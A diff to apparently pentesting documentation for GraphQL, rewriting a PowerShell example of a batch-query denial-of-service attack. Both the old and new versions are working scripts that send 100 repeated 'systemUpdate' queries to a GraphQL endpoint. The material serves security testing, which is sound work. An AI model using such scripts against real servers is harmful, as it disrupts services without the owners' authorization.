@@ -137,13 +137,21 @@ $gqlEndpointUri = "https://mygraphqlserver.company.com/graphql"
 ## Denial of Service :: Batch Query Attack
 
 ```powershell
-# Generate 100 queries:
+# Specify amount of queries to generate:
 $amountOfQueries = 100
-$jsonEntry = '{"query":"query {\n  systemUpdate\n}","variables":[]}'
-$jsonObjects = (1..$amountOfQueries | ForEach-Object { $jsonEntry }) -join ","
-$batchQueryAttackPayload = "[" + $jsonObjects + "]"
 
-Invoke-WebRequest -Uri $gqlEndpointUri -Method Post -Body $batchQueryAttackPayload -ContentType "application/json" | Select -Expand Content
+# Base query:
+$sysUpdateQuery = '
+query {
+    systemUpdate
+}
+'
+
+# For 1 to $amountOfQueries, concatenate $sysUpdateQuery and assign to $batchQueryAttackPayload:
+$batchQueryAttackPayload = ((1..$amountOfQueries | ForEach-Object { $sysUpdateQuery }).Trim()) -join "`r`n"
+
+# Send batch attack to GraphQL endpoint:
+Invoke-GraphQLQuery -Uri $gqlEndpointUri -Query $batchQueryAttackPayload
 ```
 
 ## Denial of Service :: Deep Recursion Query Attack
